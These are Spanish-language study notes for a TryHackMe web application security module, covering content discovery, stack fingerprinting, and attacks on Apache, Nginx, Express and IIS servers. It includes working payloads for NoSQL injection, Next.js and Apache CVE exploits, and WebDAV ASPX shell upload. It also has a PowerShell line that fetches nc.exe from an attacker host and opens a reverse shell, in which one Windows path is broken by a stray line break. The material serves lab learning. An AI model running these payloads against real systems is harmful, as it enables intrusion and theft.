<h1>
  <img src="https://cdn-images.tryhackme.com/modules/web-application-security-fundamentals-1778910570331.svg" width="70px" align="absmiddle">
  <span> WEB APPLICATION SECURITY FUNDAMENTALS</span>
</h1>

---

> Este módulo abre su viaje de pruebas de aplicaciones web enseñándole a caminar a través de un objetivo de la forma en que lo hace un atacante, mostrando las páginas ocultas, directorios y archivos que los usuarios comunes nunca ven. Luego profundizará en las pilas modernas que impulsan los sitios de hoy en día, entendiendo cómo los marcos de frontend, las API y las tecnologías de backend introducen cada uno su propia superficie de ataque. Al final, estarás ejecutando prácticos ataques al servidor web y leyéndolos a través de la lente de un pentester.

---

## 🚀 Matriz de Consulta Rápida (Tabla de Referencia Express)

| Categoría / Módulo | Vector / Punto de Inspección | Comando / Payload de Prueba | Indicador de Éxito / Acción |
| :--- | :--- | :--- | :--- |
| **Descubrimiento Web** | Archivos expuestos y directorios ocultos | `gobuster dir -u http://TARGET/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html` | Códigos de respuesta `200 OK`, `301 Redirect` o `403 Forbidden` a rutas no enlazadas. |
| **Virtual Hosts** | Enrutamiento por cabecera HTTP `Host:` | `gobuster vhost -u http://target.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt` | Respuestas HTTP con tamaño o código distinto al Host predeterminado. |
| **Stack MERN** | Inyección NoSQL en MongoDB | `{"username": {"$ne": null}, "password": {"$ne": null}}` en cuerpo JSON POST | Bypass de autenticación con respuesta `200 OK` y token JWT emitido. |
| **Stack Next.js** | Bypass de Middleware (CVE-2025-29927) | `curl -H "x-middleware-subrequest: 1" http://TARGET/admin` | Acceso directo a rutas protegidas por middleware sin autenticación. |
| **Stack Django** | Inyección SQL en ORM (CVE-2021-35042) | `http://TARGET/products/?order=vuln_column;SELECT%20pg_sleep(5)` | Retardo en la respuesta de 5 segundos o extracción de datos en la cláusula ORDER BY. |
| **Stack LAMP** | Path Traversal / RCE en Apache (CVE-2021-41773) | `curl -s --path-as-is "http://TARGET/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"` | Lectura de `/etc/passwd` o ejecución de comandos vía CGI en `/cgi-bin/`. |
| **Python HTTP Server** | Servidor temporal integrado | Navegación directa a `http://TARGET:8000/` | Listado automático de directorio (*Directory Listing*) y acceso a dotfiles (`.env`). |
| **Apache mod_status** | Estado interno de procesos | Navegación a `http://TARGET/server-status` | Exposición de peticiones HTTP activas, URLs solicitadas e IPs de clientes. |
| **Node.js Express** | Entornos de depuración y variables | Peticiones malformadas o acceso a `/debug`, `/trace`, `/env` | Trazas de pila verbosas, código fuente y credenciales de entorno `process.env`. |
| **Nginx autoindex** | Listado de archivos estáticos | Petición a directorios sin `index.html` | Estructura de carpetas visible y archivos comprimidos expuestos. |
| **IIS Shortname** | Vulnerabilidad de nombres 8.3 | `python3 iis_shortname_scan.py http://TARGET/` | Revelación de los primeros 6 caracteres de directorios y archivos ocultos (`~1`). |
| **IIS WebDAV** | Subida de archivos vía PUT | `curl -X PUT http://TARGET/webdav/shell.aspx -d @shell.aspx` | Código `201 Created` y ejecución de comandos mediante el intérprete ASPX. |
| **IIS Misconfigurations** | Endpoint de depuración .NET | Navegación a `http://TARGET/trace.axd` | Exposición de peticiones HTTP recientes, cookies de sesión y cabeceras de otros usuarios. |

---

<br>

<h2>
  <img src="" width="60px" align="absmiddle">
  <span> Descubrimiento de Contenido (Content Discovery)</span>
</h2>

### 1.1 Descubrimiento Manual y Archivos Comunes
El descubrimiento de contenido es la fase del reconocimiento donde el auditor identifica páginas, directorios, archivos ocultos y componentes del lado del servidor que no están enlazados directamente en el menú de navegación principal de la aplicación web. El primer paso de este proceso debe realizarse siempre de manera manual examinando aquellos archivos que los servidores web exponen por pura convención técnica.

El archivo `robots.txt` es un estándar utilizado para indicarle a los rastreadores automatizados de los motores de búsqueda qué áreas del sitio web no deben ser indexadas. Los desarrolladores suelen incluir en este archivo rutas hacia paneles de administración, directorios temporales o portales de empleados como `/staff-portal`, `/admin_backup` o `/dev_test`. Es fundamental comprender que `robots.txt` no es un mecanismo de control de acceso ni de seguridad; cualquier usuario o auditor puede navegar directamente hacia las rutas listadas en la directiva `Disallow` y acceder a ellas si el servidor no requiere autenticación adicional.

El archivo `sitemap.xml` proporciona una estructura organizada en formato XML con todas las URLs que el propietario del sitio considera relevantes para ser procesadas por buscadores. La inspección manual de este archivo permite mapear la arquitectura completa de la aplicación, identificando endpoints de APIs, estructuras de productos o carpetas de recursos que de otro modo requerirían horas de fuerza bruta.

Los favicons son pequeños iconos asociados a los sitios web que se guardan en la raíz bajo la ruta `/favicon.ico`. Dado que muchos frameworks web y gestores de contenido (como WordPress, Django, Spring Boot, Jenkins o Drupal) utilizan favicons predeterminados sin modificar, un auditor puede calcular el hash MD5 o MurmurHash3 del archivo de icono e interrogar bases de datos como Shodan mediante la consulta `http.favicon.hash:<HASH>` para identificar la tecnología exacta y otras instancias del mismo software desplegadas en Internet.

Asimismo, la comprobación manual debe incluir la búsqueda de archivos de configuración y archivos ocultos conocidos como dotfiles. Entre los más críticos se encuentran `.git` (que permite reconstruir todo el código fuente del proyecto si el directorio está expuesto), `.env` (que almacena credenciales de bases de datos y claves secretas de API), `.htaccess` (que revela reglas de reescritura de URLs y restricciones de acceso en servidores Apache), `.DS_Store` (generado por sistemas macOS exponiendo nombres de archivos locales) y copias de seguridad con extensiones `.bak`, `.old`, `.swp` o `.zip`.

<br>

### 1.2 Encabezados HTTP y Tecnologías (Headers & Framework Stack)
La inspección manual de la interacción HTTP proporciona pistas sobre la pila tecnológica que sostiene la aplicación web. Al examinar las cabeceras de respuesta HTTP devueltas por el servidor a través de herramientas de línea de comandos como `curl -I http://TARGET/` o mediante las herramientas de desarrollo del navegador, el auditor debe analizar cabeceras como `Server:` (que revela el software de servidor web y su versión, como `Apache/2.4.41` o `nginx/1.18.0`), `X-Powered-By:` (que indica el lenguaje o framework backend como `PHP/8.1.2`, `Express` o `ASP.NET`) y cabeceras específicas de frameworks como `X-Drupal-Cache` o `X-Generator`.

La provocación deliberada de páginas de error predeterminadas (por ejemplo, solicitando una ruta inexistente como `/ruta_ficticia_12345` o enviando peticiones con sintaxis malformada) fuerza al servidor a responder con plantillas de error 404 o 500 que con frecuencia contienen firmas del servidor, versiones exactas del middleware y trazas de pila que revelan la estructura interna de los directorios del servidor.

<br>

### 1.3 OSINT, Buscadores y Herramientas Web
El reconocimiento pasivo mediante inteligencia de fuentes abiertas (OSINT) permite descubrir contenido expuesto sin enviar un solo paquete directamente a la infraestructura objetivo. Google Hacking, o Google Dorking, utiliza operadores de búsqueda avanzados para consultar el índice del buscador. Entre los operadores más efectivos destacan `site:dominio.com` (para limitar los resultados al objetivo), `filetype:pdf` o `ext:php` (para filtrar por tipos de archivo específicos), `inurl:admin` (para localizar parámetros o rutas administrativas), `intitle:"index of"` (para encontrar servidores con listado de directorios habilitado) e `intext:"sql syntax error"` (para descubrir páginas que exponen errores técnicos).

Extensiones de navegador como Wappalyzer y BuiltWith analizan de forma pasiva el código HTML, los scripts de JavaScript cargados, las cookies de sesión y las cabeceras HTTP para generar un perfil completo de las tecnologías cliente y servidor utilizadas por la aplicación.

Por otro lado, los repositorios y archivos históricos proporcionan acceso a contenido que fue eliminado de la aplicación activa pero que permanece archivado externamente. La plataforma Wayback Machine (`web.archive.org`) conserva capturas históricas del sitio web, lo que permite descubrir endpoints antiguos, comentarios de código olvidados o antiguos paneles de acceso. La búsqueda en GitHub mediante palabras clave relacionadas con el dominio del cliente permite localizar repositorios públicos de desarrolladores donde se hayan filtrado por accidente credenciales o código fuente. Finalmente, la búsqueda de contenedores de almacenamiento en la nube, como AWS S3 Buckets (`http://nombre-empresa.s3.amazonaws.com`), permite identificar depósitos de archivos públicos mal configurados que almacenan datos confidenciales o copias de seguridad.

<br>

### 1.4 Descubrimiento Automatizado con Gobuster
Cuando el descubrimiento manual y el análisis OSINT concluyen, se utiliza el descubrimiento automatizado mediante técnicas de fuerza bruta y fuzzing. Estas herramientas envían miles de peticiones HTTP probando listas de palabras predefinidas (wordlists) contra el servidor web para identificar rutas válidas basadas en las respuestas HTTP obtenidas.

Gobuster es una de las herramientas de descubrimiento automatizado más rápidas del sector, desarrollada en Go para ejecutar peticiones concurrentes mediante hilos. El diccionario utilizado determina el éxito de la auditoría; repositorios como SecLists proporcionan diccionarios especializados como `directory-list-2.3-medium.txt` o `common.txt`.

El modo de descubrimiento de directorios de Gobuster se ejecuta mediante el comando `dir`. Una sintaxis completa y optimizada para auditorías reales es `gobuster dir -u http://TARGET/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak -t 50 -b 404,403`. En este comando, la opción `-u` especifica la URL objetivo, `-w` define la ruta del diccionario, `-x` añade extensiones de archivo que se concatenan a cada palabra probada, `-t 50` establece el número de hilos concurrentes para acelerar la velocidad de escaneo, y `-b 404,403` excluye códigos de estado HTTP específicos para reducir el ruido en los resultados devueltos.

<br>

### 1.5 Subdominios y Hosts Virtuales (Virtual Hosts / Vhosts)
Las aplicaciones web corporativas rara vez residen en un único dominio raíz. El descubrimiento de infraestructura requiere identificar subdominios y hosts virtuales asociados.

Existe una distinción conceptual fundamental entre un subdominio y un Virtual Host (Vhost). Un subdominio es un nombre de host registrado en el sistema de nombres de dominio (DNS) que resuelve a una dirección IP pública o privada. Por el contrario, un Virtual Host es una configuración en el servidor web que permite alojar múltiples sitios web distintos en una misma dirección IP y puerto. El servidor web determina qué sitio entregar analizando la cabecera HTTP `Host:` enviada por el navegador del cliente en cada petición. Si un auditor navega directamente a la dirección IP, el servidor devolverá el sitio predeterminado; sin embargo, si envía la cabecera `Host: dev.cliente.thm`, el servidor entregará una aplicación totalmente diferente.

Para preparar el entorno de pruebas ante entornos con nombres de dominio internos, el auditor debe actualizar el archivo de resolución local `/etc/hosts` en Linux añadiendo la dirección IP y los nombres de dominio descubiertos, por ejemplo `10.10.X.X cliente.thm dev.cliente.thm admin.cliente.thm`.

Gobuster permite realizar fuerza bruta sobre ambos entornos. Para descubrir subdominios mediante consultas DNS públicas se utiliza el modo `dns` con la sintaxis `gobuster dns -d cliente.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt`. Para descubrir hosts virtuales alojados en el mismo servidor web que no están registrados en el DNS público, se utiliza el modo `vhost` mediante el comando `gobuster vhost -u http://cliente.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain`. Esta técnica envía peticiones HTTP modificando la cabecera `Host:` en cada intento e identificando respuestas que varíen en tamaño de página o código de estado respecto a la respuesta base.

---

<br>

<h2>
  <img src="" width="60px" align="absmiddle">
  <span> Stacks Web Modernos (Modern Web Stacks)</span>
</h2>
## 2. Stacks Web Modernos (Modern Web Stacks)

### 2.1 Identificación y Huella Digital de Stacks Web
Un stack o pila web es el conjunto de tecnologías compuestas por el sistema operativo, servidor web, base de datos, lenguaje backend y framework frontend que sustentan una aplicación. Durante una auditoría de seguridad de tiempo limitado, la velocidad de identificación de la pila web es un factor determinante. Descubrir la tecnología exacta y su versión permite al auditor dirigirse inmediatamente a los vectores de ataque y CVEs conocidos, evitando perder tiempo ejecutando escaneos genéricos.

Cada pila web filtra su identidad a través de señales observables en las respuestas HTTP: nombres de cookies de sesión, estructuras de archivos estáticos, encabezados personalizados, formatos de respuesta JSON y errores de tiempo de ejecución. El flujo de trabajo profesional para evaluar cualquier pila consta de tres pasos secuenciales: primero, realizar la huella digital (fingerprinting) a partir de las señales de respuesta HTTP sin enviar payloads agresivos; segundo, confirmar la versión exacta e identificar los CVEs aplicables en bases de datos de vulnerabilidades; y tercero, ejecutar la cadena de explotación comprendiendo la causa raíz de la falla de código.

<br>

### 2.2 Pila MERN (MongoDB, Express, React, Node.js)
La pila MERN representa una de las arquitecturas JavaScript de extremo a extremo más populares en el desarrollo moderno. Está compuesta por MongoDB como base de datos NoSQL orientada a documentos, Express.js como framework de servidor web para Node.js, React como librería cliente para la interfaz de usuario, y Node.js como entorno de ejecución en el servidor.

La huella digital de la pila MERN se realiza observando señales distintivas. En el servidor, la presencia de Node.js y Express se manifiesta mediante la cabecera HTTP `X-Powered-By: Express` y el uso de cookies de sesión predeterminadas nombradas `connect.sid`. En el cliente, la presencia de React se identifica examinando el código fuente HTML, el cual suele contener un único elemento contenedor `<div id="root"></div>` acompañado de archivos JavaScript empaquetados como `bundle.js` o `main.chunk.js`, así como mediante la extensión React Developer Tools.

Los vectores de ataque en la pila MERN suelen centrarse en la capa de datos y servidor. Dado que MongoDB no utiliza SQL, es inmune a las inyecciones SQL tradicionales; sin embargo, es altamente vulnerable a inyecciones NoSQL cuando la aplicación procesa entradas de usuario en formato JSON directamente en las consultas de la base de datos. Un atacante puede enviar un objeto JSON manipulado con operadores relacionales de MongoDB como `{"username": {"$ne": null}, "password": {"$ne": null}}`. Al evaluar el operador `$ne` (no igual), la consulta se vuelve verdadera para cualquier registro, permitiendo la anulación de autenticación y la emisión de tokens JWT autorizados. Asimismo, las aplicaciones Node.js pueden ser vulnerables a la deserialización insegura de objetos cuando utilizan paquetes de análisis de datos no seguros.

<br>

### 2.3 React / Next.js
Next.js es el framework de producción estándar para React que introduce renderizado del lado del servidor (SSR), generación de sitios estáticos (SSG) y componentes de servidor de React (RSC). Su arquitectura redefine la interacción entre cliente y servidor mediante protocolos de hidratación de datos.

La huella digital de Next.js se confirma mediante la cabecera HTTP de respuesta `X-Nextjs-Page`, la presencia de rutas de recursos estáticos que comienzan por `/_next/static/` en el código fuente HTML, y estructuras de datos serializadas enviadas bajo el protocolo Flight de React Server Components.

Una de las vulnerabilidades críticas más relevantes en esta arquitectura es el desvío de controles de seguridad en capas intermedias, ejemplificado en la vulnerabilidad CVE-2025-29927 (Next.js Middleware Bypass). En aplicaciones Next.js, los desarrolladores utilizan archivos de middleware (`middleware.js`) para verificar tokens de sesión y redirigir usuarios no autorizados antes de entregar rutas protegidas como `/admin`. La falla de la vulnerabilidad reside en que el enrutador interno de Next.js confía de manera implícita en cabeceras de subpetición internas como `x-middleware-subrequest`. Un atacante externo puede inyectar la cabecera `x-middleware-subrequest: 1` en su petición HTTP dirigida a `/admin`. Al recibir esta cabecera, el servidor asume erróneamente que la petición ya fue procesada y validada por la capa de middleware, omitiendo los controles de autenticación y entregando la interfaz administrativa protegida directamente al atacante.

<br>

### 2.4 Django (Python Framework)
Django es un framework web de alto nivel escrito en Python que promueve un desarrollo rápido y un diseño limpio siguiendo el patrón Modelo-Vista-Plantilla (MVT). Incluye componentes integrados como un sistema ORM (Mapeo Relacional de Objetos), un panel de administración automatizado y mecanismos de protección contra ataques comunes.

La huella digital de Django se efectúa identificando la cookie de protección contra CSRF nombrada obligatoriamente `csrftoken` y la cookie de sesión `sessionid`. El acceso a la ruta `/admin/` despliega la interfaz de inicio de sesión distintiva de Django Admin. Si la aplicación está configurada en modo de depuración con la variable `DEBUG = True` en producción, el envío de peticiones malformadas o rutas inexistentes genera páginas de error detalladas (Django Debug Pages) que exponen las rutas internas del proyecto, variables de entorno, configuraciones de base de datos e información del sistema operativo.

A pesar de que el ORM de Django parametriza las consultas por defecto, la mala utilización de métodos de consulta internos puede introducir fallas críticas de inyección SQL, como demuestra la vulnerabilidad CVE-2021-35042. Esta falla afecta a las versiones de Django donde la entrada del usuario se pasa directamente al método de ordenación `.order_by()` de un QuerySet. En lugar de tratar el parámetro de entrada como un simple nombre de columna, el motor de Django concatenaba la entrada en la instrucción SQL `ORDER BY` resultante sin la debida desinfección. Un atacante puede enviar un parámetro como `http://TARGET/products/?order=vulnerable_col;SELECT%20pg_sleep(5)` o inyectar subconsultas SQL completas, logrando la ejecución de comandos SQL arbitrarios y la exfiltración de la base de datos a través del ORM.

<br>

### 2.5 Pila LAMP (Linux, Apache, MySQL, PHP)
La pila LAMP es la arquitectura tradicional sobre la que se han construido millones de aplicaciones web y gestores de contenido como WordPress, Joomla y Drupal. Está formada por el sistema operativo Linux, el servidor web Apache, la base de datos MySQL o MariaDB y el lenguaje de programación interpretado PHP.

La huella digital de LAMP se establece mediante la combinación de la cabecera de servidor `Server: Apache/2.4.X (Ubuntu)` y la cabecera `X-Powered-By: PHP/X.X.X`. Las URLs de la aplicación finalizan habitualmente con la extensión `.php` y el servidor responde al procesamiento de archivos de configuración local `.htaccess`.

Una de las vulnerabilidades más destructivas descubiertas en la pila LAMP es CVE-2021-41773, un fallo de salto de directorio (Path Traversal) y ejecución remota de código en Apache HTTP Server versión 2.4.49. La causa raíz de la falla reside en un cambio introducido en el módulo de normalización de rutas de Apache 2.4.49, el cual no decodificaba adecuadamente secuencias de caracteres codificadas en URL antes de verificar si intentaban salir de la raíz de documentos (DocumentRoot).

Un atacante puede enviar una petición utilizando la secuencia `.%%32%65/` o `.%2e/` (donde `%32%65` y `%2e` corresponden al punto codificado en hexadecimal). Al solicitar la URL `curl -s --path-as-is "http://TARGET/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"`, la solicitud se salta las restricciones del directorio asignado y lee cualquier archivo del sistema operativo. Además, si el módulo CGI de Apache (`mod_cgi`) está habilitado en el servidor, el atacante puede transformar la lectura de archivos en Ejecución Remota de Código (RCE) enviando una petición `POST` hacia la ruta binaria del servidor como `/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/bin/sh` e incluyendo comandos de consola en el cuerpo de la petición HTTP, logrando la ejecución inmediata de comandos en el servidor.

<br>

---

<br>

<h2>
  <img src="" width="60px" align="absmiddle">
  <span> Ataques a Servidores Web I (Web Server Attacks - I)</span>
</h2>
## 3. Ataques a Servidores Web I (Web Server Attacks - I)

### 3.1 Identificación y Reconocimiento de Servidores Web
La auditoría de servidores web orientada a la infraestructura Linux abarca tanto servidores de producción configurados formalmente como servicios web temporales o auxiliares desplegados por desarrolladores. El reconocimiento inicial debe diferenciar la arquitectura del servidor analizado entre Apache2, Nginx, servidores basados en entornos de ejecución como Node.js Express, y servidores HTTP integrados en lenguajes de programación como Python.

La identificación se realiza combinando la lectura de encabezados HTTP (`Server:`, `X-Powered-By:`), el análisis de la estructura de rutas en las herramientas de desarrollo del navegador (`DevTools`) y la observación de las respuestas ante recursos inexistentes.

<br>

### 3.2 Servidor HTTP Integrado de Python
El servidor HTTP integrado de Python se ejecuta habitualmente mediante el comando `python3 -m http.server 8000`. Es una herramienta diseñada para transferencias temporales de archivos o pruebas de desarrollo rápido, por lo que carece por completo de mecanismos de seguridad, autenticación o control de acceso.

Cuando este servidor se ejecuta en un directorio de trabajo del sistema, habilita por defecto el listado automático de directorios (Directory Listing). Cualquier usuario que navegue a la dirección IP y puerto correspondientes obtendrá un índice interactivo del sistema de archivos local.

Entre los vectores de información expuestos en este entorno destaca el acceso directo a archivos ocultos que empiezan por punto (dotfiles). El navegador o el auditor pueden acceder a archivos como `.env` (extraiendo credenciales de bases de datos), `.git/config` (revelando URLs de repositorios privados) y `.bash_history` (obteniendo comandos ejecutados previamente por el administrador). Además, es muy habitual encontrar archivos comprimidos almacenados temporalmente como `backup.tar.gz`, `site_dump.zip` o `db_export.sql`. El auditor debe descargar e inspeccionar estos archivos en su máquina local para recuperar código fuente, claves privadas SSH (`id_rsa`) y contraseñas en texto plano.

<br>

### 3.3 Servidor Web Apache2
Apache2 es el servidor web de código abierto tradicional más desplegado en entornos Linux. Su configuración por defecto y la activación no controlada de módulos internos pueden exponer información sensible.

La divulgación de versión (Version Disclosure) en Apache se produce cuando la directiva `ServerTokens` no está configurada en `Prod`, devolviendo la versión exacta del servidor y del sistema operativo subyacente en el encabezado `Server: Apache/2.4.41 (Ubuntu)`.

Una de las configuraciones erróneas más críticas es la exposición del módulo de estado interno de Apache conocido como `mod_status`. Cuando este módulo está activo y su página de acceso `/server-status` no está restringida a la dirección `127.0.0.1`, cualquier atacante externo puede consultar métricas del servidor en tiempo real. La página `/server-status` expone el estado de todos los procesos de trabajo de Apache, las direcciones IP de los clientes conectados, las peticiones HTTP activas que se están procesando actualmente y los parámetros GET enviados en las URLs por otros usuarios, lo que permite capturar tokens de sesión, claves de restablecimiento y parámetros privados en tránsito.

Para descubrir archivos y scripts desvinculados del menú de navegación en servidores Apache, se utiliza Gobuster configurado con extensiones específicas como `.php`, `.phtml`, `.conf` y `.htaccess`.

<br>

### 3.4 Node.js y Framework Express
Las aplicaciones construidas sobre Node.js utilizando el framework Express presentan comportamientos dinámicos donde las rutas no se corresponden con archivos físicos del sistema de archivos, sino con funciones controladoras definidas en el código.

La huella digital se confirma mediante el encabezado `X-Powered-By: Express` y la gestión de sesiones mediante la cookie `connect.sid`.

Cuando una aplicación Express se despliega en modo de desarrollo o presenta un manejo de errores deficiente, el envío de peticiones malformadas o tipos de datos inesperados en el cuerpo JSON activa respuestas de error extremadamente verbosas. Estas trazas de pila (stack traces) revelan el archivo ejecutable exacto, la línea de código donde falló la petición y las rutas absolutas del servidor en la estructura `/home/user/app/node_modules/`.

Asimismo, las aplicaciones Express suelen exponer endpoints de depuración e inspección que no fueron deshabilitados antes de la publicación, como `/debug`, `/trace` o `/metrics`. En entornos mal configurados, el acceso a estos endpoints o la lectura de errores puede exponer las variables de entorno globales de la aplicación (`process.env`), filtrando claves maestras de bases de datos, tokens de API de terceros y secretos de firma JWT.

<br>

### 3.5 Servidor Web Nginx
Nginx es un servidor web de alto rendimiento y proxy inverso diseñado para gestionar miles de conexiones concurrentes mediante una arquitectura orientada a eventos.

Cuando Nginx está configurado para servir archivos estáticos, la inclusión de la directiva `autoindex on;` dentro del bloque de configuración de un directorio habilita el listado automático de archivos, mostrando una interfaz HTML con el contenido de la carpeta cuando no existe un archivo `index.html`.

Al igual que Apache con `mod_status`, Nginx incluye el módulo `stub_status` para monitorizar el rendimiento. Si la ruta `/nginx_status` se encuentra habilitada públicamente sin restricciones de IP, un auditor puede extraer datos sobre las conexiones activas, peticiones aceptadas y el volumen de tráfico procesado por el servidor.

<br>

### 3.6 Configuraciones Erróneas Comunes y Escaneo Automatizado
Existen patrones de configuración errónea que aplican a todos los servidores web independientemente del software utilizado. La ausencia de encabezados HTTP de seguridad debilita la postura defensiva del sitio: la falta de `Strict-Transport-Security` (HSTS) permite ataques de degradación de SSL; la ausencia de `Content-Security-Policy` (CSP) facilita la ejecución de scripts maliciosos en ataques XSS; y la falta de `X-Frame-Options` o `X-Content-Type-Options` expone la aplicación a ataques de Clickjacking y derivación de tipos MIME (MIME-sniffing).

El escaneo automatizado de servidores web se complementa con herramientas como Nikto, un escáner de vulnerabilidades especializado en identificar archivos peligrosos, configuraciones predeterminadas obsoletas, programas CGI vulnerables y errores de servidor. El comando básico de ejecución es `nikto -h http://TARGET/`. Nikto analiza las cabeceras HTTP, prueba la existencia de más de 6700 archivos y programas potencialmente peligrosos y verifica la presencia de opciones de servidor inseguras.


<br>

---

<br>

<h2>
  <img src="" width="60px" align="absmiddle">
  <span> Ataques a Servidores Web II (Web Server Attacks - II)</span>
</h2>
## 4. Ataques a Servidores Web II (Web Server Attacks - II)

### 4.1 Identificación y Arquitectura de Internet Information Services (IIS)
Internet Information Services (IIS) es el servidor web propietario de Microsoft integrado en los sistemas operativos Windows Server. A diferencia de los servidores web independientes en entornos Linux, IIS está profundamente integrado con la arquitectura del sistema operativo Windows, la autenticación integrada (NTLM/Kerberos), el framework .NET y Active Directory, lo que convierte a un servidor IIS comprometido en la puerta de entrada ideal para ataques de pivoteamiento e infiltración en redes corporativas.

La identificación de la versión de IIS a través del encabezado HTTP `Server: Microsoft-IIS/X.X` permite mapear de manera directa la versión del sistema operativo Windows Server subyacente. Por ejemplo, IIS 7.5 corresponde a Windows Server 2008 R2; IIS 8.0 y 8.5 corresponden a Windows Server 2012 y 2012 R2 respectivamente; e IIS 10.0 corresponde a Windows Server 2016, 2019 y 2022.

La arquitectura de IIS se sostiene sobre componentes clave que determinan la superficie de ataque. El motor en modo núcleo `HTTP.sys` intercepta las peticiones HTTP/HTTPS entrantes y las redirige hacia el proceso de trabajo correspondiente denominado `w3wp.exe` (IIS Worker Process). Cada aplicación web se ejecuta de manera aislada dentro de un fondo de aplicación (Application Pool o AppPool). El privilegio del proceso `w3wp.exe` depende de la identidad asignada a dicho AppPool, la cual por defecto es la cuenta de servicio `IIS AppPool\DefaultAppPool`, pero que en entornos mal configurados suele asignarse a cuentas con privilegios elevados como `Local System` o usuarios administradores del dominio.

El reconocimiento inicial se completa ejecutando peticiones de captura de banners y verificando los métodos HTTP soportados mediante la petición `curl -X OPTIONS -v http://TARGET/`. La presencia de encabezados como `MS-Author-Via: DAV` o la inclusión de métodos como `PROPFIND`, `PROPPATCH`, `MKCOL`, `COPY` y `MOVE` confirma la presencia activa de la extensión WebDAV (Distributed Authoring and Versioning).

### 4.2 Enumeración de Nombres Cortos de IIS (IIS Tilde / 8.3 Short Filename Enumeration)
La vulnerabilidad de enumeración de nombres cortos de IIS (conocida como IIS Tilde Enumeration) es una falla de divulgación de información que surge por la compatibilidad heredada del sistema de archivos NTFS con el formato de nombres de archivo 8.3 de MS-DOS.

Por defecto, cuando se crea un archivo o directorio con un nombre largo en Windows (por ejemplo, `DirectorioSecretoAdministrativo`), el sistema de archivos NTFS crea automáticamente un nombre corto equivalente de 8 caracteres seguido de una tilde y un número, como `DIRECT~1`.

La vulnerabilidad en IIS radica en una diferencia de comportamiento del servidor web ante peticiones HTTP que contienen el carácter tilde (`~`) y comodines (`*`). Cuando un usuario solicita una ruta utilizando la convención 8.3, el servidor IIS responde con un código de estado HTTP diferente o una longitud de respuesta distinta dependiendo de si el archivo corto existe o no en el sistema de archivos. Por ejemplo, enviar `http://TARGET/a*~1*/.aspx` devolverá un error `404 Not Found` si existe un archivo o carpeta cuyo nombre empiece por "a", mientras que devolverá un error `400 Bad Request` si no existe ninguno.

Esta discrepancia permite a un auditor enumerar de manera automatizada los primeros 6 caracteres de todos los archivos y directorios ocultos presentes en el servidor web sin necesidad de adivinar palabras mediante diccionarios tradicionales. Para automatizar este ataque se utiliza la herramienta `iis_shortname_scan.py` mediante el comando `python3 iis_shortname_scan.py http://TARGET/`. Una vez descubiertos los nombres cortos (por ejemplo, `ADMINI~1` o `CONFIG~1.XML`), el auditor utiliza diccionarios enfocados para reconstruir el nombre largo completo y acceder directamente al recurso protegido.

### 4.3 Explotación de WebDAV y Subida de Shells ASPX
WebDAV es una extensión del protocolo HTTP que permite a los usuarios editar y gestionar archivos directamente en el servidor web remoto. Si WebDAV está habilitado sin controles de autenticación o con credenciales débiles, se convierte en un vector directo para obtener acceso inicial y ejecución remota de código.

Para lograr una explotación exitosa y conseguir la ejecución de una shell web a través de WebDAV, deben cumplirse simultáneamente tres condiciones esenciales en la configuración del servidor IIS: primero, que el método HTTP `PUT` esté permitido en el servidor; segundo, que el directorio de destino tenga permisos de escritura habilitados para la cuenta anónima o el usuario autenticado; y tercero, que el directorio tenga permisos de ejecución habilitados para scripts ejecutable en el servidor (.NET / ASPX).

El procedimiento de explotación comienza preparando un archivo de shell web escrito en ASPX. Una vez creado el archivo local `shell.aspx`, se sube al servidor WebDAV utilizando la herramienta `curl` mediante el comando `curl -T shell.aspx http://TARGET/webdav/shell.aspx` o utilizando clientes de línea de comandos especializados en WebDAV como `cadaver`. Si el servidor responde con un código `201 Created` o `200 OK`, la subida se ha realizado con éxito. Finalmente, el auditor navega hacia la URL `http://TARGET/webdav/shell.aspx` a través del navegador o `curl` para confirmar que el servidor interpreta el código .NET y ejecuta la shell.

### 4.4 Shells Web ASPX y Escalada de Acceso
Una shell web ASPX es un script escrito en C# o VB.NET diseñado para ejecutarse dentro del entorno de tiempo de ejecución de .NET en el servidor IIS. Al ser procesado por el proceso de trabajo `w3wp.exe`, el script recibe parámetros de entrada a través de peticiones HTTP, los ejecuta como comandos del sistema operativo subyacente y devuelve la salida en la respuesta web.

La metodología para transformar una shell web inicial en un acceso interactivo completo consta de tres pasos. El primer paso es verificar la ejecución de comandos básicos a través de la interfaz de la shell web enviando instrucciones del sistema operativo como `whoami`, `hostname` e `ipconfig`.

El segundo paso es escalar la shell web a una shell inversa interactiva en Netcat. Para ello, el auditor inicia un oyente en su máquina local mediante `nc -lvnp 4444`. A continuación, ejecuta a través de la shell web ASPX una instrucción que fuerce al servidor Windows a conectar de vuelta a su equipo. Esto se logra mediante la ejecución de un comando de PowerShell codificado en Base64 o entregando el binario `nc.exe` hacia la máquina víctima mediante PowerShell: `powershell -c "Invoke-WebRequest -Uri http://ATACANTE_IP/nc.exe -OutFile C:\Windows\Temp
c.exe"; C:\Windows\Temp
c.exe ATACANTE_IP 4444 -e cmd.exe`.

El tercer paso consiste en verificar los privilegios asignados dentro de la shell inversa recibida. El auditor ejecuta `whoami /priv` para inspeccionar los privilegios de token de la cuenta de usuario. La presencia de privilegios como `SeImpersonatePrivilege` o `SeAssignPrimaryTokenPrivilege` permite ejecutar de manera inmediata herramientas de escalada de privilegios locales como PrintSpoofer, RoguePotato o JuicyPotato para elevar el acceso directamente a la cuenta `NT AUTHORITY\SYSTEM`.

En el panorama real de amenazas, actores de ciberespionaje avanzados utilizan shells web ASPX highly optimizadas como China Chopper, la cual consta de una sola línea de código .NET capaz de recibir y evaluar bloques de código C# arbitrarios enviados en el cuerpo de peticiones POST HTTP.

### 4.5 Configuraciones Erróneas Específicas de IIS
Los servidores IIS presentan un conjunto recurrente de configuraciones erróneas que exponen la infraestructura sin necesidad de utilizar exploits complejos.

La primera configuración errónea es el listado de directorios habilitado (Directory Browsing), el cual muestra la estructura completa de carpetas y archivos cuando no se encuentra un archivo predeterminado como `default.aspx` o `index.html`.

La segunda es la habilitación no restringida de los métodos HTTP `PUT` y `DELETE`, permitiendo a usuarios anónimos subir nuevos archivos ejecutables o eliminar recursos críticos de la aplicación.

